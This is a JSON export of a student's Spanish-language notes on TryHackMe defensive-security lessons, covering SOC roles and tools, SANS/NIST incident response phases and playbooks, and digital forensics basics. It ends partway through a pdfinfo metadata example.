    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/2-soc-fundamentals/5-technology/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/2. SOC Fundamentals/5. Technology.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 2. SOC Fundamentals",
    "content": "Teniendo a la gente y los procesos correctos en su lugar nunca sería suficiente sin soluciones de seguridad para detección y respuesta. La porción de tecnología en los pilares del SOC se refiere a las soluciones de seguridad. Estas soluciones minimizan de forma eficiente el esfuerzo manual que realiza el equipo del SOC para detectar amenazas y responder a ellas.\n\nLa red de una organización consiste en múltiples dispositivos y aplicaciones. Como equipo de seguridad, detectar y responder individualmente a amenazas en cada uno de estos, requeriría un esfuerzo y consumo de recursos importantes. Las soluciones de seguridad centralizan la información de los dispositivos o aplicaciones presentes en la red.\n\nVeamos algunas de estas soluciones:\n\n- **SIEM:** Security Information and Event Management es una herramienta popular usada en casi todos los entornos SOC. Esta recoge logs de varios dispositivos de red. Las reglas de detección se configuran en la solución SIEM, que contiene lógica para identificar actividad sospechosa y nos alerta en caso de match.\n- **EDR:** Endpoint Detection and Response ofrece al equipo del SOC con visibilidad de las actividades de los dispositivos en tiempo real y su historial. Opera a nivel de endpoint y ofrece respuestas automatizables.\n- **Firewall:** Funciona puramente para la seguridad de la red y actúa como una barrera entre la red interna y externa. Monitoriza tráfico entrante y saliente y filtra cualquier tráfico no autorizado mediante reglas lógicas. También tiene algunas funcionalidades de detección que nos ayudan a bloquear tráfico antes de que llegue a la red interna.\n\nOtras muchas soluciones de seguridad juegan un papel clave en el entorno SOC, como los antivirus, EPP (Endpoint Protection Platform), IDS/IPS (Intrusion Detection/Prevention System), XDR, SOAR (Security Orchestration Automation and Response) y más."
  },
  {
    "title": "2. Purpose and Components",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/2-soc-fundamentals/2-purpose-and-components/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/2. SOC Fundamentals/2. Purpose and Components.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 2. SOC Fundamentals",
    "content": "El objetivo principal de un equipo SOC es mantener la Detección y la respuesta intactas. El equipo cuenta con recursos en forma de soluciones de seguridad que les ayuda a conseguir dicho objetivo. Estos integran toda la red de la compañía y los sistemas que moritorizar desde una localización centralizada.\n\n------------------------\n<h2>Detección</h2>\n- **Detectar vulnerabilidades:** Una vulnerabilidad es una debilidad que un atacante puede explotar para llevar las cosas más allá de su nivel de permisos. Pueden ser descubiertas en el software de cualquier dispositivo. Aunque parchear las vulnerabilidades no es responsabilidad del SOC, las vulnerabilidades no arregladas afectan a la seguridad de toda la empresa.\n- **Detectar actividad no autorizada:** Considera el caso donde un atacante descubre el nombre de usuario y la contraseña de uno de los empleados y los usa para loguearse en el sistema de la compañía. Es crucial detectarlo rápidamente antes de que cause daños. Algunas pistas pueden ser la localización geográfica o la IP del equipo, por ejemplo.\n- **Detectar violación de políticas:** Una política de seguridad es un conjunto de reglas y procedimientos creados para ayudar a proteger la empresa contra amenazas de seguridad y a cumplir con la normativa vigente. Podrían considerarse violaciones descargar software pirata o mandar archivos confidenciales de forma insegura.\n- **Detectar intrusiones:** Las intrusiones se refieren a acceso no autorizado a los sistemas y redes. Un escenario sería un atacante explotando nuestra aplicación web. Otro sería visitar un sitio malicioso e infectar el ordenador.\n\n---------------------------\n<h2>Respuesta</h2>\n- **Soporte con respuesta de incidencias:** Una vez detectado el incidente, ciertos pasos se toman para responder a ellos. Incluye minimizar el impacto y realizar el análisis de la causa raíz del incidente. El equipo SOC también ayuda al equipo IR a realizar estos pasos.\n\nHay tres pilares en un SOC. Con estos, un equipo SOC se vuelve maduro y eficiente detectando y respondiendo a diferentes incidentes. Estos pilares son **People**, **Process** y **Technology**.\n\n![[Pasted image 20251019205936.png]]\n"
  },
  {
    "title": "3. People",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/2-soc-fundamentals/3-people/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/2. SOC Fundamentals/3. People.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 2. SOC Fundamentals",
    "content": "Sin importar cuánto evolucione la automatización de la mayoría de actividades de seguridad, la gente en un SOC siempre será importante. Una solución de seguridad puede generar numerosas flags rojas, lo que puede generar mucho ruido.\n\nEn un SOC, con soluciones de seguridad sin intervención humana, acabarás centrándote demasiado en problemas más irrelevantes. Es la gente la que ayuda a la solución de seguridad a identificar amenazas reales.\n\nA la gente se la conoce como equipo SOC y se divide en:\n\n![[Pasted image 20251019211812.png]]\n\n- **Analista SOC (L1):** Cualquier cosa detectada por la solución de seguridad pasará primero por estos analistas. Llevan a cabo disparos de alerta básicos para determinar si una detección es maliciosa. Reportan dichas detecciones por los canales correspondientes.\n- **Analista SOC (L2):** Algunas detecciones pueden requerir de investigación más exhaustiva. Los analistas de nivel 2 ayudan a los de nivel 1 a correlacionar la información de múltiples fuentes para realizar un análisis como es debido.\n- **Analista SOC (L3):** Son profesionales con experiencia que buscan proactivamente cualquier indicador de amenaza y ayudan en las actividades de respuesta a incidentes.\n- **Ingeniero de Seguridad:** Los ingenieros de seguridad despliegan y configuran las soluciones de seguridad con las que trabajan los analistas y aseguran su funcionamiento correcto.\n- **Ingeniero de Detección:** Las reglas de seguridad son la lógica construida detrás de las soluciones de seguridad para detectar actividad maliciosa.\n- **Manager del SOC:** Gestiona los procesos que siguen los integrantes del SOC y ofrece apoyo. Se mantiene en contacto con el CISO (Chief Information Security Officer) de la organización para ofrecerle actualizaciones en la postura y esfuerzos del SOC."
  },
  {
    "title": "1. Introduction to SOC",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/2-soc-fundamentals/1-introduction-to-soc/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/2. SOC Fundamentals/1. Introduction to SOC.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 2. SOC Fundamentals",
    "content": "La tecnología ha hecho nuestras vidas más eficientes, pero esa eficiencia viene con una responsabilidad. Los miedos de los días modernos han evolucionado mucho. Los secretos o información crítica ya no se almacenan en medios físicos (como libretas) sino digitalmente. Por eso, cualquier irrupción no autorizada, pérdida o modificación de esta información puede causar un inmenso daño.\n\nUn **SOC** (**S**ecurity **O**perations **C**enter) es una facilidad dedicada operada por un equipo de seguridad especializado. Este equipo intenta continuamente monitorizar la red y recursos de la organización para identificar actividad sospechosa o prevenir daños. Este equipo trabaja 24 horas al día 7 días a la semana.\n\n-------------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Construir una base para el SOC.\n- Detección y respuesta en el SOC.\n- El rol de la gente, los procesos y la tecnología.\n- Ejercicio práctico."
  },
  {
    "title": "4. Process",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/2-soc-fundamentals/4-process/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/2. SOC Fundamentals/4. Process.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 2. SOC Fundamentals",
    "content": "Ya hemos visto los roles y responsabilidades de diferentes individuos trabajando en un equipo SOC. Cada rol tiene sus propios procesos. Veamos algunos procesos importantes involucrados en un SOC.\n\n-------------------------\n<h2>Alert Triage</h2>\nEs la base del equipo SOC. La primera respuesta a cualquier alerta es realizar una clasificación de criticidad (triage). Se enfoca en analizar la alerta específica. Determina la severidad de la alerta y nos ayuda a priorizar. Se basa en responder a las 5 Ws: \n\n![[Pasted image 20251019220532.png]]\nUn ejemplo:\n\n>[!CAUTION] Alerta: Malware detectado en el Host George PC.\n\n| 5 Ws   | Answers                                                                                                                                                                                                                       |\n| ------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| What?  | A malicious file was detected on one of the hosts inside the organization’s network.                                                                                                                                          |\n| When?  | The file was detected at 13:20 on June 5, 2024.                                                                                                                                                                               |\n| Where? | The file was detected in the directory of the host: \"GEORGE PC\".                                                                                                                                                              |\n| Who?   | The file was detected for the user George.                                                                                                                                                                                    |\n| Why?   | After the investigation, it was found that the file was downloaded from a pirated software-selling website. The investigation with the user revealed that they downloaded the file as they wanted to use a software for free. |\n\n--------------------------\n<h2>Reporting</h2>\nLas alertas detectadas dañinas necesitan escalarse a análisis de más alto nivel para una respuesta y solución. Estas alertan se escalan como tickets y se asignan a la gente relevante. El reporte debería incluir las 5 Ws junto con un análisis más profundo y capturas de pantalla como prueba de la actividad.\n\n----------------------------\n<h2>Incident Response and Forensics</h2>\nA veces, las detecciones reportadas apuntan a actividades maliciosas que son críticas. En estos casos, un equipo de alto nivel que inicia una respuesta. El incidente a veces requiere una investigación forense que intenta averiguar la causa raíz del incidente analizando un sistema o red.\n\n"
  },
  {
    "title": "0. SOC Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/2-soc-fundamentals/0-soc-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/2. SOC Fundamentals/0. SOC Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 2. SOC Fundamentals",
    "content": "[[1. Introduction to SOC]]\n[[2. Purpose and Components]]\n[[3. People]]\n[[4. Process]]\n[[5. Technology]]\n"
  },
  {
    "title": "0. Defensive Security Intro",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/1-defensive-security-intro/0-defensive-security-intro/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/1. Defensive Security Intro/0. Defensive Security Intro.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 1. Defensive Security Intro",
    "content": "[[2. Defensive Security Intro]]\n"
  },
  {
    "title": "0. Incident Response Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/4-incident-response-fundamentals/0-incident-response-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/4. Incident Response Fundamentals/0. Incident Response Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 4. Incident Response Fundamentals",
    "content": "[[1. Introduction to Incident Response]]\n[[2. What are Incidents?]]\n[[3. Types of Incidents]]\n[[4. Incident Response Process]]\n[[5. Incident Response Techniques]]\n\n"
  },
  {
    "title": "3. Types of Incidents",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/4-incident-response-fundamentals/3-types-of-incidents/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/4. Incident Response Fundamentals/3. Types of Incidents.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 4. Incident Response Fundamentals",
    "content": "La gente normalmente etiqueta cualquier actividad dañida asociada con el mundo digital como un intento de hacking. Puede ser correcto, pero es muy genérico en términos de ciberseguridad. Los incidentes de seguridad pueden ser de varios tipos. En las tareas anteriores hemos visto cómo una alerta de verdadero positivo, que se transformó en un incidente después del análisis del equipo de seguridad. Este estaba correlacionado con un email de phishing, que probablemente venía con un archivo adjunto malicioso. Si se descarga en el sistema este archivo, puede tener graves consecuencias. Algunos de los tipos de incidentes más comunes son:\n\n- **Infecciones de Malware:** El malware es un programa malicioso que puede dañar el sistema, la red o una aplicación. La mayoría de incidentes son asociados con infecciones de malware. Hay varios tipos de malware, cada uno con su potencial único para causar daños. Son mayormente causados por archivos de texto, documentos, ejecutables, etc.\n- **Brechas de Seguridad:** Las brechas de seguridad ocurren cuando una persona no autorizadda consigue acceso a información confidencial. Son una de las más dañinas porque la mayoría de las empresas recaen en información sensible o privada que sólo el personal autorizado debe poder ver.\n- **Filtraciones de Información:** Son incidentes en los que la información confidencial de un individuo u organización es expuesto a entidades no autorizadas. Muchos atacantes usan estos data leaks para empeorar la reputación de las empresas o personas o conseguir lo que quieren de ellas. Al contrario que las brechas de seguridad pueden pasar por accidente por parte de un usuario.\n- **Ataques de Insider:** Incidentes desde dentro de una organización. Cuando un empleado disgustado con la empresa le otorga o usa información confidencial que posee a un atacante o el mismo lo usa para fines maliciosos.\n- **Ataques de Denegación de Servicio:** Ocurren cuando un atacante inunda la red, sistema o aplicación de una compañia y hace que se caiga. Como consecuencia, ningún usuario tiene acceso al servicio.\n\nTodos estos incidentes tienen su impacto negativo potencial único en la víctima. No pueden ser comparados en términos de la severida del impacto que crean. Esto es porque un incidente particular puede ser desastroso para una organización pero prácticamente inofensivo para otra."
  },
  {
    "title": "5. Incident Response Techniques",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/4-incident-response-fundamentals/5-incident-response-techniques/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/4. Incident Response Fundamentals/5. Incident Response Techniques.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 4. Incident Response Fundamentals",
    "content": "Recuerda que hemos estudiado la segunda fase del ciclo de respuesta a incidentes: \"Identificación\" en SANS y \"Detección y Análisis\" en NIST. Es muy difícil mirar a un comportamiento inusual e identificar incidentes manualmente. Hay múltiples soluciones de seguridad que sirven para su propio rol en la detección de incidentes. Algunos tienen la capacidad de responder.\n\n- **SIEM:** La solución Security Information and Event Manager (SIEM) recolecta todos los logs importantes en una localización centralizada y los correlaciona con los incidentes.\n- **AV:** El antivirus detecta programas maliciosos conocidos en un sistema con escaneos regulares.\n- **EDR:** Endpoint Detection and Response se despliega en cada sistema, protegiéndolo contra algunas amenazas de nivel avanzado. También puede contener y erradicar la amenaza.\n\nDespués de identificar los incidentes, deben seguirse ciertos procedimientos, incluyendo investigar la extensión del ataque, tomar medidas necesarias para evitar más daño y eliminarlo de la raíz. Estos pasos pueden ser diferentes dependiendo del tipo de incidente. En este escenario, tener instrucciones paso a paso para cada incidente ayuda mucho. Estas soluciones se conocen como **playbooks**.\n\nAquí vemos un ejemplo de playbook:\n\n1. Notificar a todos los interesados del incidente de phishing en email.\n2. Determinar si el email era malicioso realizando análisis de header y body del email.\n3. Buscar cualquier archivo adjunto al email y analizarlo.\n4. Aislar el sistema infectado de la red.\n5. Bloquear al recipiente.\n\nPor otro lado, los **runbooks** son instrucciones paso a paso detalladas sobre pasos específicos durante diferentes incidentes. Estos pasos pueden variar en función de los recursos dispoonibles para la investigación.\n\n"
  },
  {
    "title": "1. Introduction to Incident Response",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/4-incident-response-fundamentals/1-introduction-to-incident-response/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/4. Incident Response Fundamentals/1. Introduction to Incident Response.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 4. Incident Response Fundamentals",
    "content": "Imagina vivir en una calle extremadamente insegura con cosas de mucho valor en tu casa. Debes estar pensando en tener un guardia de seguridad y unas pocas cámaras CCTV en tu casa. Esconder el material valioso dentro de una sala bajo tierra es una buena idea si un intruso consigue entrar.\n\nA parte de estas medidas proactivas, ¿consideraste alguna vez cómo las cosas funcionarían si alguien bypasease exitosamente tu seguridad externa y ganase acceso a tu casa? También debes tomar ciertas medidas una vez que tu casa ya ha sido allanada.\n\nTomemos el ejemplo de arriba al reino digital. Probablemente hayas oído a cerca de un ciberataque a alguna organización que causó que perdieran miles de dólares. Casos como esos se reportan en internet a diario. A estos nos referimos como incidentes de ciberseguridad. \n\nIncident Response (respuesta a incidentes) desde el comienzo hasta el final. Desde el despliegue de la seguridad en varias áreas para prevenir incidentes hasta pelear con ellos para minimizar su impacto.\n\n-----------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Vista de qué son los incidentes y sus niveles de severidad.\n- Tipos comunes de incidentes.\n- Fases de la respuesta a incidentes desde los frameworks SANS y NIST.\n- Herramientas para la detección de incidentes y la respuesta junto con el rol de los playbooks.\n- Plan de respuesta a incidentes.\n\n---------------------------\n<h2>Pre-requisitos</h2>\n[[1. Introduction to Defensive Security]]\n\n"
  },
  {
    "title": "4. Incident Response Process",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/4-incident-response-fundamentals/4-incident-response-process/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/4. Incident Response Fundamentals/4. Incident Response Process.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 4. Incident Response Fundamentals",
    "content": "En la tarea anterior hemos visto varios tipos de incidentes. A veces, manejar una variedad de incidentes en un entorno puede ser complicado. Debido a la naturaleza distintiva de los incidentes en las organizaciones, debería haber un proceso estructurado para respuesta a incidentes. Los frameworks de respuesta a incidentes nos ayudan a esto. Veremos los dos frameworks más usados: SANS y NIST.\n\nEl framework de respuesta a incidentes SANS tiene 6 fases (PICERL):\n\n| Fase                 | Explicación                                                                                                                        | Ejemplo                                                                                       |\n| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- |\n| Preparación          | Incluye construir los recursos necesarios para manejar el incidente.                                                               | Realizar entrenamiento para empleados sobre emails de phishing.                               |\n| Identificación       | Busqueda de cualquier comportamiento inusual que indique un incidente.                                                             | Ver cantidades ingentes de información ser descargadas de un ordenador.                       |\n| Contención           | Suele ser hecho aislando la máquina víctima, desactivando sus cuentas, etc.                                                        | Se aísla un dispositivo de la red para no permitir al atacante pivotar.                       |\n| Erradicación         | Incluye eliminar la amenaza del entorno atacado. Asegura la limpieza del entorno.                                                  | Se realiza un escaneo de malware exhaustivo en el equipo víctima.                             |\n| Recuperación         | Incluye recuperar los sistemas afectados desde un backup o reconstruirlos.                                                         | El host comprometido fue reconfigurado y la información restaurada de una copia de seguridad. |\n| Lecciones Aprendidas | Una parte muy importante es reflexionar sobre por qué ha ocurrido lo ocurrido. Nos permite mejorar nuestros sistemas de seguridad. | Realizar una reunión post incidente para analizar las causas base.                            |\nEl framework de respuesta a incidentes NIST es similar al SANS. El número de fases que tiene este se reduce a 4:\n\n![[Pasted image 20251021223143.png]]\n\nUna comparación:\n\n![[Pasted image 20251021223201.png]]\n\nCada proceso tiene una forma de documentación formal. El documento formal se llama Plan de Respuesta a Incidentes.\n\nLas partes clave de este documento (aunque no se limita a ellas) son:\n\n- Roles y Responsabilidades.\n- Metodología de Respuesta a Incidentes.\n- Comunicación con accionistas y cuerpos de seguridad.\n- Camino de escalada a seguir.\n\n"
  },
  {
    "title": "2. What are Incidents?",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/4-incident-response-fundamentals/2-what-are-incidents/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/4. Incident Response Fundamentals/2. What are Incidents?.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 4. Incident Response Fundamentals",
    "content": "Muchos procesos diferentes corren en nuestros dispositivos como portátiles, móviles, etc. Algunos de estos procesos son interactivos, lo que significa que puedes realizar acciones como jugar a un juego o ver un vídeo. También hay algunos que no son interactivos corriendo en segundo plano, simplemente son necesarios. Cualquiera de estos dos tipos de procesos, al realizar acciones, deja un rastro llamado evento (log).\n\nLos eventos se generan en números enormes, regularmente. Esto es porque muchos procesos corren en un mismo dispositivo, cada uno realizazndo diferentes rutinas, generando numerosos eventos. ¿Cómo comprobamos si estos numerosos eventos apuntan a algo peligroso o destructivo ocurriendo en el ordenador? Ahí entran en juego las soluciones de seguridad.\n\nCuando una solución de seguridad encuentra un evento o grupo de estos asociado a una posible actividad dañina, dispara una alerta. El equipo de seguridad analiza esta alerta. Algunas son falsos positivos, mientras que otras pueden ser verdaderos positivos.\n\nLas alertas de verdaderos positivos son **Incidentes**. Asumiendo que la alerta es un incidente, el próximo paso es darle un nivel de severidad. Se pueden categorizar los incidentes como **Low**, **Medium**, **High** o **Critical**."
  },
  {
    "title": "1. Introduction to Digital Forensics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/3-digital-forensics-fundamentals/1-introduction-to-digital-forensics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/3. Digital Forensics Fundamentals/1. Introduction to Digital Forensics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 3. Digital Forensics Fundamentals",
    "content": "La forénsica es la aplicación de métodos y procedimientos para investigar y resolver crímenes. La rama de la forense que investiga el cibercrímen se conoce como forénsica digital. El cibercrímen es cualquier actividad llevada a cabo en cualquier dispositivo digital. Varias herraminetas se utilizan para investigar los dispositivos digitales después de un crímen para encontrar y analizar las pruebas para cualquier acción legal necesaria.\n\nLos dispositivos digitales han resuelto muchos de nuestros problemas. A parte de resolver problemas, debido al incremento de dispositivos digitales también se ha visto una subida de los crímenes digitales.\n\nConsideremos un ejemplo donde los cuerpos de seguridad del estado allanan la casa de un ladrón de bancos con los correspondientes permisos de registro. Algunos dispositivos digitales, incluyendo un portátil, un móvil un disco duro y un USB, han sido hallados en su casa. El equipo de forense llevó a cabo una investigación a fondo en su laboratorio, equipado con herramientas de forense. Se encontró la siguiente evidencia.\n\n- Un mapa del banco se encontró en el portátil del sospechoso.\n- Un documento con las rutas de entrada y escape del banco se encontró en su disco duro.\n- Un documento en el disco duro que listaba todos los controles de seguridad físicos del banco.\n- Algunos archivos, incluídas fotos y vídeos de los robos anteriores del sospechoso, dentro del portátil.\n- Algunos chats de grupo ilegales y registros de llamada relativos al robo del banco en el móvil del sujeto.\n\nToda esta evidencia ayudó a los cuerpos de seguridad en el proceso legal del caso. Este escenario discute un caso de principio a final. Algunos procedimientos son seguidos por el equipo de forénsica digital mientras recolectan la evidencia, la almacenan, la analizan y la reportan.\n\n-------------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Fases de la forénsica digital.\n- Tipos de forénsica digital.\n- Procedimiento de la adquisición de evidencia.\n- Forénsica de Windows.\n- Resolviendo un caso de forénsica digital.\n\n"
  },
  {
    "title": "0. Digital Forensics Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/3-digital-forensics-fundamentals/0-digital-forensics-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/3. Digital Forensics Fundamentals/0. Digital Forensics Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 3. Digital Forensics Fundamentals",
    "content": "[[1. Introduction to Digital Forensics]]\n[[2. Digital Forensics Methodology]]\n[[3. Evidence Acquisition]]\n[[4. Windows Forensics]]\n[[5. Practical Example of Digital Forensics]]\n"
  },
  {
    "title": "4. Windows Forensics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/3-digital-forensics-fundamentals/4-windows-forensics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/3. Digital Forensics Fundamentals/4. Windows Forensics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 3. Digital Forensics Fundamentals",
    "content": "El tipo más común de evidencia recolectada de las escenas de crímen son PCs de escritorio y portátiles, ya que la mayoría de crímen incumbe un sistema personal. Estos dispositivos tienen diferentes sistemas operativos corriendo en ellos. En esta tarea veremos la adquisición de evidencia y el análisis de sistemas operativos Windows, que es un sistema operativo muy común que ha sido investigada en varios casos.\n\nComo parte de la fase de recolección, se toman imágenes del sistema operativo Windows. Estas imágenes forenses son copias bit a bit del sistema operativo entero. Se toman dos categorías de imágenes forenses en los sistemas operativos Windows.\n\n- **Imagen de Disco:** La imagen de disco contiene toda la información presente en el almacenamiento del dispositivo del sistema (HDD, SDD, etc.). Esta información no es volátil, lo que significa que sobreviviría incluso si se apagara el dispositivo.\n- **Imagen de Memoria:** Contiene la información dentro de la RAM del sistema operativo. Esta memoria es volátil, lo que significa que la información se perdería si se apagase el dispositivo. Por ejemplo procesos, archivos abiertos, redes conectadas, etc. Esta imágen tiene prioridad sobre la otra.\n\nVeamos algunas herramientas populares usadas para estos dos tipos de de imagen:\n\n- **FKT Imager:** Es una herramienta ampliamente usada para tomar imágenes de disco de Windows. Ofrece una interfaz gráfica de usuario amigable. Puede analizar los contenidos de una imagen de disco. Puede ser usado para adquisición o análisis.\n- **Autopsy:** [Autopsy](https://www.autopsy.com/) es una plataforma de forense digital de código abierto. Un investigador puede importar cualquier imagen de disco adquirida a esta herramienta y esta realizará un examen extensivo de esta. Ofrece funcionalidades valiosas durante el análisis de la imagen, incluyendo la búsqueda del teclado, archivos borrados, metadatos de archivos, detección de extensiones incorrectas y mucho más.\n- **DumpIt:** [DumpIt](https://www.toolwar.com/2014/01/dumpit-memory-dump-tools.html) ofrece la utilidad de tomar imágenes de memoria de un sistema operativo Windows. Esta herramienta crea una imagen de memoria usando una interfaz de línea de comandos y unos pocos comandos. La imagen de la memoria puede tomarse en diferentes formatos.\n- **Volatility:** [Volatility](https://volatilityfoundation.org/) es una herramienta de código abierto poderosa para analizar imágenes de memoria. Ofrece plugins extremadamente útiles. Cada artefacto puede ser analizado usando un plugin específico. Esta herramienta soporta varios sistemas operativos, como Windows, Linux, macOS y Android.\n\n"
  },
  {
    "title": "2. Digital Forensics Methodology",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/3-digital-forensics-fundamentals/2-digital-forensics-methodology/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/3. Digital Forensics Fundamentals/2. Digital Forensics Methodology.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 3. Digital Forensics Fundamentals",
    "content": "El equipo de forénsica digital tiene varios casos requiriendo herramientas y técnicas diferentes. Sin embargo, el Instituto Nacional de Estándares y Tecnología (NIST) define un proceso general para cada caso. ELl NIST funciona definiendo frameworks para diferentes areas de la tecnología, incluyendo la ciberseguridad, donde introducen el proceso de la forénsica digital en cuatro fases.\n\n![[Pasted image 20251020172734.png]]\n\n1. **Recopilación:** La primera fase de la forénsica digital es la recopilación de información. Identificar todos los dispositivos de los que se puede recopilar información es clave. Usualmente un investigador encuentra portátiles, móviles, cámaras digitales, discos duros USBs, etc.\n2. **Examinación:** La información recolectada puede intimidar a los investigadores debido a su tamaño. Esta, usualmente necesita ser filtrada para extraer la información relevante.\n3. **Análisis:** Esta es la fase crítica. Los investigadores tienen que analizar la información correlacionándola con varias piezas de evidencia para sacar conclusiones. El análisis busca extraer las actividades relevantes para la cronología del caso.\n4. **Reporte:** En la última fase, se prepara un informe detallado. Este contiene la metodología y hallazgos detallados de la información recolectada. El informe se presenta a la autoridad competente y se deja en sus manos.\n\nComo parte de la fase de recolección, vimos que varias piezas de evidencia puede ser encontradas en la escena del crímen. Analicar estas múltiples categorías de evidencia requiere varias herramientas y técnicas. Hay diferentes tipos de forénsica digital, todo con sus propias metodologías de recolección y análisis. Algunos de los tipos más comunes son:\n\n- **Computer Forensics:** El tipo más común de forénsica digital es la forénsica de ordenadores, que concierne investigar ordenadores, los dispositivos más comúnmente usados en los cibercrímenes.\n- **Mobile Forensics:** Concierne investigar los dispositivos móviles y extraer evidencia como registros de llamada, mensajes de texto, localización GPS y más.\n- **Database Forensics:** Cubre la investigación más allá de los dispositivos individuales. Incluye la red completa. La mayoría de la evidencia recolectada de esta son logs de tráfico web.\n- **Cloud Forensics:** Involucra investigar información guardada en la nube. Puede ser peliagudo para los investigadores.\n- **Email Forensics:** El método de comunicación más común entre profesionales. Los emails se investigan para determinar si son phishing o no.\n\n\n"
  },
  {
    "title": "5. Practical Example of Digital Forensics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/3-digital-forensics-fundamentals/5-practical-example-of-digital-forensics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/3. Digital Forensics Fundamentals/5. Practical Example of Digital Forensics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 3. Digital Forensics Fundamentals",
    "content": "Cuando creas un archivo de texto, `TXT`, se guarda cierta información en el sistema operativo, como la fecha de creación y la fecha de la última modificación. Sin embargo, muchos metadatos se quedan guardados en el documento si usas un editor más avanzado como MS Word. Hay varias formas de leer los metadatos de un archivo. Exportar el archivo a otro formato, como `PDF`, mantendría la mayoría de los metadatos, dependiendo del PDF writer usado.\n\nVeamos lo que podemos aprender de un archivo PDF. Podemos tratar de leer los metadatos usando el programa `pdfinfo`. Este muestra varios metadatos relacionados con el archivo, como título, asunto, autor, creador y fecha de creación. Puedes instalar `pdfinfo` con: `sudo apt install poppler-utils`. Considera el siguiente ejemplo:\n\n```shell\nroot@tryhackme:~# pdfinfo DOCUMENT.pdf  \n\tCreator:        Microsoft® Word for Office 365 \n\tProducer:       Microsoft® Word for Office 365 \n\tCreationDate:   Wed Oct 10 21:47:53 2018 EEST \n\tModDate:        Wed Oct 10 21:47:53 2018 EEST \n\tTagged:         yes \n\tUserProperties: no \n\tSuspects:       no \n\tForm:           none \n\tJavaScript:     no \n\tPages:          20 \n\tEncrypted:      no \n\tPage size:      